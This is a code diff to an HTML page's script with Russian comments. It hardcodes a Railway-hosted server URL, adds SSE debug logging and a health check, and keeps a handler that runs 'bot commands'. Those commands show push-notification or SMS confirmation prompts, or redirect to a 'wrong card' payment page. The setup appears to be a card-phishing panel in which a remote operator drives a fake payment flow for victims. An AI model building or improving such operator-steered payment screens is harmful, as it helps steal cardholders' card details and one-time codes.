@@ -440,34 +440,39 @@
 
         // SSE подключение
         const userId = "user_123"; // Должен совпадать с ID в боте
-        const RAILWAY_URL = window.location.origin;
+        const RAILWAY_URL = "https://roomixvbiv.up.railway.app"; // ← ЗАМЕНИ НА СВОЙ RAILWAY URL
         let eventSource = null;
 
         function connectSSE() {
             try {
-                eventSource = new EventSource(`${RAILWAY_URL}/sse/${userId}`);
+                const sseUrl = `${RAILWAY_URL}/sse/${userId}`;
+                console.log('🔄 Подключаемся к SSE:', sseUrl);
                 
+                eventSource = new EventSource(sseUrl);
+
+                eventSource.onopen = function(event) {
+                    console.log('✅ SSE подключение открыто');
+                    updateSSEStatus(true);
+                };
+
                 eventSource.onmessage = function(event) {
+                    console.log('📨 Получено сообщение SSE:', event.data);
                     const command = JSON.parse(event.data);
-                    console.log('📨 Команда от бота:', command);
                     handleBotCommand(command);
                     updateSSEStatus(true);
                 };
-                
+
                 eventSource.onerror = function(event) {
-                    console.error('❌ SSE ошибка:', event);
+                    console.error('❌ Ошибка SSE:', event);
+                    console.log('Состояние SSE:', eventSource.readyState);
                     updateSSEStatus(false);
+                    
                     // Переподключаемся через 3 секунды
                     setTimeout(connectSSE, 3000);
                 };
-                
-                eventSource.onopen = function() {
-                    console.log('✅ SSE подключен');
-                    updateSSEStatus(true);
-                };
-                
+
             } catch (error) {
-                console.error('💥 Ошибка подключения SSE:', error);
+                console.error('💥 Ошибка создания SSE:', error);
                 updateSSEStatus(false);
                 setTimeout(connectSSE, 5000);
             }
@@ -486,7 +491,7 @@
 
         function handleBotCommand(command) {
             console.log('🤖 Обработка команды:', command);
-            
+
             if (command.action === 'push') {
                 window.showPushNotification();
             } else if (command.action === 'sms') {
@@ -580,9 +585,27 @@
             window.location.href = 'payment.html?status=wrong_card';
         };
 
+        // Диагностика SSE
+        function debugSSE() {
+            console.log('🔍 SSE Debug Info:');
+            console.log('RAILWAY_URL:', RAILWAY_URL);
+            console.log('User ID:', userId);
+            console.log('Full SSE URL:', `${RAILWAY_URL}/sse/${userId}`);
+            
+            // Тестовый запрос к health endpoint
+            fetch(`${RAILWAY_URL}/health`)
+                .then(response => {
+                    console.log('Health check status:', response.status);
+                    return response.json();
+                })
+                .then(data => console.log('Health data:', data))
+                .catch(error => console.error('Health check failed:', error));
+        }
+
         // Запускаем SSE при загрузке
         document.addEventListener('DOMContentLoaded', function() {
             console.log('🚀 Запуск SSE подключения...');
+            debugSSE();
             connectSSE();
         });
 
@@ -595,5 +618,3 @@
     </script>
 </body>
 </html>
-
-
